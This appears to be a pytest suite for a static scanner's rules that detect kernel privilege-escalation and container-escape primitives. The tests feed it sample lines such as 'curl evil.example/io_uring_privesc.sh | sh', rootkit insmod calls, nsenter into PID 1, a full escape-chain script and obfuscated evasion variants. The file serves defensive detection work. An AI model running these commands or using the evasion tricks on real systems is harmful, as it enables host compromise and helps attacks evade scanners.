"""Tests for the kernel-privesc SAST rules (SA-PY-025..031, SA-SH-020..024).

Detection pack for the primitive set behind VM/sandbox escape chains
(user-namespace creation, AF_NETLINK, net/sched control, kernel module loads,
capability manipulation, io_uring). These tests pin positives, negatives, and
adversarial variants (numeric-flag evasion, quoted subprocess tokens, getattr
and from-import aliasing, string concatenation, line continuations).

Round-2 design contract (adversarial-review driven):

* Dual-use shaping: bare dual-use PRESENCE is not an exploit signal. A bare
  pyroute2 import/reference does not fire (was 1,182 criticals on pyroute2
  itself in round 1); namespace syscalls require exploit-shaped usage
  (user-namespace flags, syscall numbers, exec context, getattr/from-import
  indirection); modprobe/insmod is demoted (SA-PY-031 medium, SA-SH-022 high)
  because system tooling loads modules routinely; nsenter only fires when
  targeting literal PID 1 / --target=1 (the container-escape shape), not the
  rootless-docker shape of entering a $pid's namespaces.
* Comment lines (leading optional whitespace then #) never match the SA-PY /
  SA-SH kernel rules; echo-prose lines and shell function definitions of
  modprobe/insmod do not match SA-SH-022 (an echo-led line still matches when a
  command separator ;/&&/||/| precedes the module load); read-only/diagnostic invocations
  (capsh --print/--decode, modprobe -n/-l/--show/--list) are excluded; tc
  show/getcap were already non-matching by construction.
* Severity tiering: critical = exploit-shaped usage (userns creation, tc
  mutation, act_pedit, capability writes, io_uring, AF_NETLINK); high/medium =
  dual-use module loads.

KNOWN LIMITATIONS (documented, accepted):
* pyroute2 fluent-API mutation (ipr.tc('add', 'htb', ...)) is NOT covered:
  per-line it is indistinguishable from pyroute2's own test suite (26 calls in
  pyroute2/tests). Only the pedit action shape (.tc(... pedit)) is matched.
* unshare(FLAGS_VARIABLE) / setns(fd, nstype_variable) with the flag behind a
  variable is not resolved; ctypes getattr with multi-segment concatenation
  beyond "un"+"share" / "set"+"ns" is not resolved.
* Shell variable indirection for the module-load lane (modprobe $MOD) is
  deliberately NOT flagged: legitimate tooling (moby) uses it. $VAR in the tc
  lane ($TC qdisc add) IS flagged; general $VAR/$() command indirection is a
  documented gap.
* ctypes raw syscalls by number are covered for x86_64 unshare/setns/clone3
  (272/308/435, SA-PY-026) and io_uring_setup (425, SA-PY-030) only;
  other architectures and other syscall numbers are a gap.
* AF_NETLINK sockets behind a variable or paren-split argument are not
  resolved (SA-PY-027 matches literal/named first arguments only).
* Embedded interpreters in .sh (python3 -c, perl -e), PowerShell carriers
  (.ps1), and Dockerfile/workflow-yaml carriers are outside this regex pack.
* Line continuations are joined in scan_sast's preprocessing for the SAST
  pack; the runtime_dynamism regex pass does not join continuations.
"""

import scan_sast as scanner


def _rule_ids(findings):
    return {f.rule_id for f in findings}


def _scan_py(tmp_path, body, name="probe.py"):
    f = tmp_path / name
    f.write_text(body)
    return scanner.scan_file(str(f), name)


def _scan_sh(tmp_path, body, name="probe.sh"):
    f = tmp_path / name
    f.write_text(body)
    return scanner.scan_file(str(f), name)


class TestUserNamespacePython:
    def test_clone_newuser_flag(self, tmp_path):
        findings = _scan_py(tmp_path, "import os\nos.unshare(CLONE_NEWUSER)\n")
        assert "SA-PY-025" in _rule_ids(findings)

    def test_clone_newuser_flag_combo(self, tmp_path):
        findings = _scan_py(tmp_path, "os.unshare(CLONE_NEWUSER | CLONE_NEWNET)\n")
        assert "SA-PY-025" in _rule_ids(findings)

    def test_unshare_numeric_flag_evasion(self, tmp_path):
        # 0x10000000 == CLONE_NEWUSER; dodges the flag-name rule, caught by the
        # syscall-name rule.
        findings = _scan_py(tmp_path, "libc.unshare(0x10000000)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_setns_ctypes(self, tmp_path):
        findings = _scan_py(tmp_path, "libc.setns(fd, 0)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_clone3_call(self, tmp_path):
        findings = _scan_py(tmp_path, "pid = libc.clone3(ctypes.byref(args), size)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_quoted_subprocess_token(self, tmp_path):
        findings = _scan_py(tmp_path, 'subprocess.run(["unshare", "-U"])\n')
        assert "SA-PY-026" in _rule_ids(findings)

    def test_benign_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "unshares(x)\nunset(x)\ngit_clone(repo)\n")
        assert "SA-PY-025" not in _rule_ids(findings)
        assert "SA-PY-026" not in _rule_ids(findings)


class TestAfNetlinkPython:
    def test_named_constant(self, tmp_path):
        findings = _scan_py(tmp_path, "socket.socket(socket.AF_NETLINK, socket.SOCK_RAW)\n")
        assert "SA-PY-027" in _rule_ids(findings)

    def test_numeric_family_evasion(self, tmp_path):
        findings = _scan_py(tmp_path, "s = socket(16, socket.SOCK_RAW, 0)\n")
        assert "SA-PY-027" in _rule_ids(findings)

    def test_pf_netlink_alias(self, tmp_path):
        findings = _scan_py(tmp_path, "socket.socket(socket.PF_NETLINK, 0)\n")
        assert "SA-PY-027" in _rule_ids(findings)

    def test_benign_sockets_negative(self, tmp_path):
        body = "socket.socket(socket.AF_INET)\nsocket.socket(socket.AF_INET6)\nsocket.socket(socket.AF_UNIX)\nsocket.socket(socket.AF_PACKET)\n"
        findings = _scan_py(tmp_path, body)
        assert "SA-PY-027" not in _rule_ids(findings)

    def test_prose_mention_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "# AF_NETLINK mention\n")
        assert "SA-PY-027" not in _rule_ids(findings)


class TestNetSchedPython:
    def test_bare_pyroute2_import_negative(self, tmp_path):
        # "Imports a networking library" is not "kernel exploit": bare
        # pyroute2 presence must NOT fire (1,182-FP explosion on pyroute2
        # itself in round 1).
        findings = _scan_py(tmp_path, "import pyroute2\nfrom pyroute2 import IPRoute\nip = IPRoute()\n")
        assert "SA-PY-028" not in _rule_ids(findings)

    def test_pyroute2_fluent_api_plain_add_negative(self, tmp_path):
        # pyroute2's own test suite calls .tc('add', ...) 26 times; a plain
        # fluent-API add is indistinguishable per-line and must not fire.
        findings = _scan_py(tmp_path, "context.ipr.tc('add', 'htb', index=index, handle='1:')\n")
        assert "SA-PY-028" not in _rule_ids(findings)

    def test_pyroute2_fluent_api_pedit(self, tmp_path):
        findings = _scan_py(tmp_path, 'ipr.tc("add-action", "pedit", index=idx)\n')
        assert "SA-PY-028" in _rule_ids(findings)

    def test_quoted_tc_subprocess_tokens(self, tmp_path):
        findings = _scan_py(tmp_path, 'subprocess.run(["tc", "qdisc", "add", "dev", "lo", "root", "netem"])\n')
        assert "SA-PY-028" in _rule_ids(findings)

    def test_tc_comment_line_negative(self, tmp_path):
        findings = _scan_py(tmp_path, '# "kind" object: see `tc filter add dev iface basic match`\n')
        assert "SA-PY-028" not in _rule_ids(findings)

    def test_tc_config_string(self, tmp_path):
        findings = _scan_py(tmp_path, "os.system('tc qdisc add dev eth0 root netem')\n")
        assert "SA-PY-028" in _rule_ids(findings)

    def test_act_pedit_module(self, tmp_path):
        findings = _scan_py(tmp_path, "mod = 'act_pedit'\n")
        assert "SA-PY-028" in _rule_ids(findings)

    def test_tc_show_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "os.system('tc qdisc show')\n")
        assert "SA-PY-028" not in _rule_ids(findings)


class TestCapabilityPython:
    def test_capset_call(self, tmp_path):
        findings = _scan_py(tmp_path, "capset(hdrp, datap)\n")
        assert "SA-PY-029" in _rule_ids(findings)

    def test_prctl_capbset(self, tmp_path):
        findings = _scan_py(tmp_path, "libc.prctl(PR_CAPBSET_DROP, 19, 0, 0, 0)\n")
        assert "SA-PY-029" in _rule_ids(findings)

    def test_libcap_binding(self, tmp_path):
        findings = _scan_py(tmp_path, "cap.cap_set_proc()\n")
        assert "SA-PY-029" in _rule_ids(findings)

    def test_benign_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "capacity(x)\nprctl(PR_SET_NAME, name)\n")
        assert "SA-PY-029" not in _rule_ids(findings)


class TestIoUringPython:
    def test_setup_call(self, tmp_path):
        findings = _scan_py(tmp_path, "libc.io_uring_setup(128, ctypes.byref(params))\n")
        assert "SA-PY-030" in _rule_ids(findings)

    def test_liburing_load(self, tmp_path):
        findings = _scan_py(tmp_path, 'CDLL("liburing.so.2")\n')
        assert "SA-PY-030" in _rule_ids(findings)

    def test_prose_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "# io_uring is fast\nduring_setup()\n")
        assert "SA-PY-030" not in _rule_ids(findings)


class TestModuleLoadPython:
    def test_subprocess_list_form(self, tmp_path):
        findings = _scan_py(tmp_path, 'subprocess.run(["modprobe", "act_pedit"])\n')
        assert "SA-PY-031" in _rule_ids(findings)

    def test_sbin_path_form(self, tmp_path):
        findings = _scan_py(tmp_path, "os.system('/sbin/modprobe act_pedit')\n")
        assert "SA-PY-031" in _rule_ids(findings)

    def test_insmod(self, tmp_path):
        findings = _scan_py(tmp_path, 'os.system("insmod /root/evil.ko")\n')
        assert "SA-PY-031" in _rule_ids(findings)

    def test_bare_word_negative(self, tmp_path):
        findings = _scan_py(tmp_path, "# load with modprobe\nrmmod act_pedit\n")
        assert "SA-PY-031" not in _rule_ids(findings)


class TestUserNamespaceShell:
    def test_unshare_long_flags(self, tmp_path):
        findings = _scan_sh(tmp_path, "#!/bin/sh\nunshare --user --map-root-user bash\n")
        assert "SA-SH-020" in _rule_ids(findings)

    def test_unshare_combined_short_flags(self, tmp_path):
        findings = _scan_sh(tmp_path, "#!/bin/sh\nunshare -Urm bash\n")
        assert "SA-SH-020" in _rule_ids(findings)

    def test_nsenter(self, tmp_path):
        findings = _scan_sh(tmp_path, "nsenter -t 1 -m -u bash\n")
        assert "SA-SH-020" in _rule_ids(findings)

    def test_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "share -x file\n# unshare mentioned\n")
        assert "SA-SH-020" not in _rule_ids(findings)


class TestNetSchedShell:
    def test_tc_qdisc_add(self, tmp_path):
        findings = _scan_sh(tmp_path, "tc qdisc add dev eth0 root handle 1: htb\n")
        assert "SA-SH-021" in _rule_ids(findings)

    def test_tc_action_pedit(self, tmp_path):
        findings = _scan_sh(tmp_path, "tc action add action pedit munge ip ttl set 63\n")
        assert "SA-SH-021" in _rule_ids(findings)

    def test_tc_show_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "tc qdisc show\ntc -s qdisc\n")
        assert "SA-SH-021" not in _rule_ids(findings)

    def test_etc_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "cat /etc config\n")
        assert "SA-SH-021" not in _rule_ids(findings)


class TestModuleLoadShell:
    def test_modprobe(self, tmp_path):
        findings = _scan_sh(tmp_path, "modprobe act_pedit\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_insmod_path(self, tmp_path):
        findings = _scan_sh(tmp_path, "insmod /root/evil.ko\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_sudo_prefix(self, tmp_path):
        findings = _scan_sh(tmp_path, "sudo modprobe br_netfilter\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_rmmod_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "rmmod act_pedit\n")
        assert "SA-SH-022" not in _rule_ids(findings)


class TestCapabilityShell:
    def test_setcap(self, tmp_path):
        findings = _scan_sh(tmp_path, "setcap cap_net_admin+ep /tmp/x\n")
        assert "SA-SH-023" in _rule_ids(findings)

    def test_capsh(self, tmp_path):
        findings = _scan_sh(tmp_path, "capsh --drop=cap_setpcap -- -c id\n")
        assert "SA-SH-023" in _rule_ids(findings)

    def test_setpriv(self, tmp_path):
        findings = _scan_sh(tmp_path, "setpriv --reuid 0 bash\n")
        assert "SA-SH-023" in _rule_ids(findings)

    def test_getcap_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "getcap /usr/bin/ping\n")
        assert "SA-SH-023" not in _rule_ids(findings)


class TestIoUringShell:
    def test_compile_exploit(self, tmp_path):
        findings = _scan_sh(tmp_path, "gcc -o x io_uring_exploit.c\n")
        assert "SA-SH-024" in _rule_ids(findings)

    def test_download_loader(self, tmp_path):
        findings = _scan_sh(tmp_path, "curl evil.example/io_uring_privesc.sh | sh\n")
        assert "SA-SH-024" in _rule_ids(findings)

    def test_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "echo during setup\nio_uring\n")
        assert "SA-SH-024" not in _rule_ids(findings)


class TestSharedRootChain:
    """End-to-end: the documented escape chain shape fires across the pack."""

    def test_full_chain_script(self, tmp_path):
        body = (
            "#!/bin/sh\n"
            "unshare --user --map-root-user sh\n"
            "modprobe act_pedit\n"
            "tc qdisc add dev lo root handle 1: prio\n"
            "tc action add action pedit munge ip ttl set 63\n"
            "setcap cap_net_admin+ep /tmp/helper\n"
        )
        findings = _scan_sh(tmp_path, body)
        ids = _rule_ids(findings)
        assert {"SA-SH-020", "SA-SH-021", "SA-SH-022", "SA-SH-023"} <= ids
        ours = [f for f in findings if f.rule_id and f.rule_id.startswith("SA-SH-02")]
        # Exploit-shaped primitives are critical; the modprobe line also fires
        # the demoted dual-use module-load rule at high (and SA-SH-021 at
        # critical via act_pedit).
        for f in ours:
            expected = "high" if f.rule_id == "SA-SH-022" else "critical"
            assert f.severity == expected, (f.rule_id, f.severity)


class TestExtensionGating:
    def test_bash_alias_routes_shell_rules(self, tmp_path):
        findings = _scan_sh(tmp_path, "unshare --user sh\n", name="probe.bash")
        assert "SA-SH-020" in _rule_ids(findings)

    def test_kernel_rules_do_not_fire_in_js(self, tmp_path):
        f = tmp_path / "probe.js"
        f.write_text("// unshare --user\n")
        findings = scanner.scan_file(str(f), "probe.js")
        assert "SA-SH-020" not in _rule_ids(findings)


class TestNamespaceEvasionPython:
    """Adversarial variants for SA-PY-025/026 (round-2 coverage)."""

    def test_getattr_simple(self, tmp_path):
        findings = _scan_py(tmp_path, 'getattr(os, "unshare")(0x10000000)\n')
        assert "SA-PY-026" in _rule_ids(findings)

    def test_getattr_concat_unshare(self, tmp_path):
        findings = _scan_py(tmp_path, 'getattr(os, "un" + "share")(0x10000000)\n')
        assert "SA-PY-026" in _rule_ids(findings)

    def test_getattr_concat_setns(self, tmp_path):
        findings = _scan_py(tmp_path, 'getattr(libc, "set" + "ns")(fd, 0)\n')
        assert "SA-PY-026" in _rule_ids(findings)

    def test_from_import_alias(self, tmp_path):
        # The alias call _u(0x10000000) is unresolvable per-line; the
        # from-import of the syscall name is the flagged line.
        findings = _scan_py(tmp_path, "from os import unshare as _u\n_u(0x10000000)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_from_import_no_alias_negative(self, tmp_path):
        # pyroute2's own shape: importing a netns helper unaliased is the
        # legitimate-consumption lane, not an evasion.
        findings = _scan_py(tmp_path, "from pyroute2.netns import setns\n")
        assert "SA-PY-026" not in _rule_ids(findings)

    def test_syscall_number_setns(self, tmp_path):
        findings = _scan_py(tmp_path, "libc.syscall(308, fd, 0)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_syscall_number_unshare(self, tmp_path):
        findings = _scan_py(tmp_path, "libc.syscall(272, 0x10000000)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_decimal_flag_evasion(self, tmp_path):
        # 268435456 == 0x10000000 == decimal CLONE_NEWUSER: dodges the flag
        # name AND the hex form, caught as a decimal literal.
        findings = _scan_py(tmp_path, "libc.unshare(268435456)\n")
        assert "SA-PY-026" in _rule_ids(findings)

    def test_decimal_newnet_constant_quiet(self, tmp_path):
        # 1073741824 == 0x40000000 == decimal CLONE_NEWNET: netns management
        # (pyroute2's purpose), not the user-namespace escape primitive. The
        # decimal lane must match the named-flag contract exactly.
        findings = _scan_py(tmp_path, "libc.unshare(1073741824)\n")
        assert "SA-PY-025" not in _rule_ids(findings)
        assert "SA-PY-026" not in _rule_ids(findings)

    def test_newnet_only_not_user_ns(self, tmp_path):
        # CLONE_NEWNET alone is netns management (pyroute2's purpose), not the
        # user-namespace escape primitive; SA-PY-025/026 stay quiet.
        findings = _scan_py(tmp_path, "if libc.unshare(CLONE_NEWNET) < 0:\n")
        assert "SA-PY-025" not in _rule_ids(findings)
        assert "SA-PY-026" not in _rule_ids(findings)

    def test_definition_and_docstring_negatives(self, tmp_path):
        body = (
            "def setns(netns, flags=os.O_CREAT, libc=None, fork=True):\n"
            "    setns('/proc/1/ns/net')  # go back to default netns\n"
            "    state = ('setns', 'invalid')\n"
        )
        findings = _scan_py(tmp_path, body)
        assert "SA-PY-026" not in _rule_ids(findings)

    def test_syscall_number_io_uring_setup(self, tmp_path):
        # 425 == io_uring_setup on x86_64; labeled by the io_uring rule.
        findings = _scan_py(tmp_path, "libc.syscall(425, 32, ctypes.byref(params))\n")
        assert "SA-PY-030" in _rule_ids(findings)

    def test_variable_flag_documented_gap(self, tmp_path):
        # unshare(FLAGS) with the flag behind a variable is NOT resolved
        # (documented limitation); assert the current contract honestly.
        findings = _scan_py(tmp_path, "os.unshare(flags)\n")
        assert "SA-PY-026" not in _rule_ids(findings)


class TestModuleLoadEvasionPython:
    def test_concat_string(self, tmp_path):
        findings = _scan_py(tmp_path, 'cmd = "mod" + "probe" + " act_pedit"\n')
        assert "SA-PY-031" in _rule_ids(findings)

    def test_insmod_concat(self, tmp_path):
        findings = _scan_py(tmp_path, 'cmd = "in" + "smod /root/evil.ko"\n')
        assert "SA-PY-031" in _rule_ids(findings)

    def test_medium_severity(self, tmp_path):
        findings = _scan_py(tmp_path, 'subprocess.run(["modprobe", "act_pedit"])\n')
        ours = [f for f in findings if f.rule_id == "SA-PY-031"]
        assert ours and all(f.severity == "medium" for f in ours)


class TestShellEvasion:
    """Shell-lane adversarial coverage (round 2)."""

    def test_line_continuation_unshare(self, tmp_path):
        findings = _scan_sh(tmp_path, "#!/bin/sh\nunshare \\\n-Urn sh\n")
        assert "SA-SH-020" in _rule_ids(findings)
        ours = [f for f in findings if f.rule_id == "SA-SH-020"]
        assert ours[0].line == 2  # reported at the logical line's start

    def test_escaped_backslash_not_continuation(self, tmp_path):
        # A line ending in an escaped backslash is a literal backslash; the
        # next line is separate and must not be joined into a match.
        findings = _scan_sh(tmp_path, "unshare -m \\\\\n-Urn sh\n")
        assert "SA-SH-020" not in _rule_ids(findings)

    def test_variable_tc_command(self, tmp_path):
        findings = _scan_sh(tmp_path, "$TC qdisc add dev lo root netem\n")
        assert "SA-SH-021" in _rule_ids(findings)

    def test_tc_batch_file(self, tmp_path):
        findings = _scan_sh(tmp_path, "tc -batch /tmp/evil.tc\n")
        assert "SA-SH-021" in _rule_ids(findings)

    def test_modprobe_empty_string_concat(self, tmp_path):
        findings = _scan_sh(tmp_path, "mod\"\"probe act_pedit\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_comment_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "# modprobe the OVS kernel module\n\t# modprobe act_pedit\n")
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_modprobe_function_definition_negative(self, tmp_path):
        body = "function modprobe {\n  echo \"Setting up modprobe for OVS kmod...\"\n}\n"
        findings = _scan_sh(tmp_path, body)
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_modprobe_echo_prose_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, 'echo "Setting up modprobe for OVS kmod..."\n')
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_modprobe_readonly_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "modprobe -n -v dummy\nmodprobe --show depends\nmodprobe -l net\n")
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_modprobe_variable_arg_negative(self, tmp_path):
        # moby contrib/dockerd-rootless-setuptool.sh shape: variable module
        # args are dual-use and deliberately not flagged (documented gap).
        findings = _scan_sh(tmp_path, "modprobe $iptables_module\n")
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_capsh_print_readonly_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "capsh --print | grep -q 'Bounding set'\ncapsh --decode=00000000a80425fb\n")
        assert "SA-SH-023" not in _rule_ids(findings)

    def test_capsh_comment_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "# ldconfig and capsh are kept in /sbin\n")
        assert "SA-SH-023" not in _rule_ids(findings)

    def test_nsenter_variable_pid_negative(self, tmp_path):
        # moby dockerd-rootless shapes: entering a $pid's namespaces is the
        # rootless-docker lane, not the escape lane (literal PID 1).
        findings = _scan_sh(tmp_path, 'exec nsenter --no-fork -U -t "$pid" -- "$@"\nnsenter -n"$netns" sysctl -w net.ipv4.ip_forward=1\n')
        assert "SA-SH-020" not in _rule_ids(findings)

    def test_unshare_mount_only_negative(self, tmp_path):
        findings = _scan_sh(tmp_path, "unshare --mount --propagation private bash\n")
        assert "SA-SH-020" not in _rule_ids(findings)

    def test_nsenter_zero_padded_pid1(self, tmp_path):
        # -t 01 / --target=001 are still literal PID 1 (container-escape
        # shape); zero padding must not dodge the guard.
        findings = _scan_sh(tmp_path, "nsenter -t 01 -m bash\nnsenter --target=001 -u sh\n")
        ours = [f for f in findings if f.rule_id == "SA-SH-020"]
        assert len(ours) == 2

    def test_comment_backslash_continuation_shell(self, tmp_path):
        # `# \` + newline + payload: in bash the backslash inside a comment
        # is inert, so the second line EXECUTES. The comment gate must apply
        # per physical line, not to a wrongly joined logical line.
        findings = _scan_sh(tmp_path, "# \\\nunshare --user sh\n")
        ours = [f for f in findings if f.rule_id == "SA-SH-020"]
        assert ours and ours[0].line == 2

    def test_modprobe_echo_semicolon_prefix(self, tmp_path):
        # echo-led line whose echo is mere staging prose: the modprobe after
        # the command separator is a live module load, not echo prose.
        findings = _scan_sh(tmp_path, 'echo "setting up"; modprobe uio\n')
        assert "SA-SH-022" in _rule_ids(findings)

    def test_insmod_echo_semicolon_prefix(self, tmp_path):
        findings = _scan_sh(tmp_path, "echo ok; insmod /tmp/rootkit.ko\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_logical_and_prefix(self, tmp_path):
        findings = _scan_sh(tmp_path, "echo ok && modprobe uio\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_prose_with_colon_negative(self, tmp_path):
        # Pure prose: modprobe inside the echo argument, no command
        # separator before it. Still quiet.
        findings = _scan_sh(tmp_path, 'echo "next: modprobe act_pedit"\n')
        assert "SA-SH-022" not in _rule_ids(findings)

    def test_modprobe_echo_background_prefix(self, tmp_path):
        # Single-& background separator: `echo "..." & modprobe uio` runs
        # modprobe for real. Round-4 gap closed.
        findings = _scan_sh(tmp_path, 'echo "setting up" & modprobe uio\n')
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_command_substitution(self, tmp_path):
        # $( ) command substitution: the module load executes to produce the
        # echo argument.
        findings = _scan_sh(tmp_path, "echo $(modprobe uio)\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_insmod_echo_command_substitution_prose_prefix(self, tmp_path):
        findings = _scan_sh(tmp_path, "echo result: $(insmod /tmp/rootkit.ko)\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_insmod_echo_arithmetic_and_substitution(self, tmp_path):
        # $(( arithmetic plus $( substitution on one echo-led line.
        findings = _scan_sh(tmp_path, 'echo "n=$((1+2))" $(insmod /tmp/rootkit.ko)\n')
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_process_substitution_input(self, tmp_path):
        # <( ) process substitution executes the module load in bash.
        # Round-5 gap closed.
        findings = _scan_sh(tmp_path, "echo <(modprobe uio)\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_insmod_echo_process_substitution_prose_prefix(self, tmp_path):
        findings = _scan_sh(tmp_path, "echo result: <(insmod /tmp/rootkit.ko)\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_process_substitution_output(self, tmp_path):
        # >( ) process substitution also executes the command.
        findings = _scan_sh(tmp_path, "echo >(modprobe uio)\n")
        assert "SA-SH-022" in _rule_ids(findings)

    def test_modprobe_echo_pure_redirection_negative(self, tmp_path):
        # Pure redirection: > without ( is not a separator; the target is a
        # filename. Must stay quiet.
        findings = _scan_sh(tmp_path, "echo hi > modprobe-notes\n")
        assert "SA-SH-022" not in _rule_ids(findings)


class TestCommentContinuationPython:
    def test_comment_backslash_continuation_python(self, tmp_path):
        # Same shape in Python: `# \` is an inert comment; the next physical
        # line is live code and must be matched on its own.
        findings = _scan_py(tmp_path, "# \\\nos.unshare(CLONE_NEWUSER)\n")
        assert "SA-PY-025" in _rule_ids(findings)
        ours = [f for f in findings if f.rule_id == "SA-PY-025"]
        assert ours[0].line == 2

    def test_comment_backslash_continuation_python_decimal(self, tmp_path):
        findings = _scan_py(tmp_path, "# staging \\\nlibc.unshare(268435456)\n")
        assert "SA-PY-026" in _rule_ids(findings)
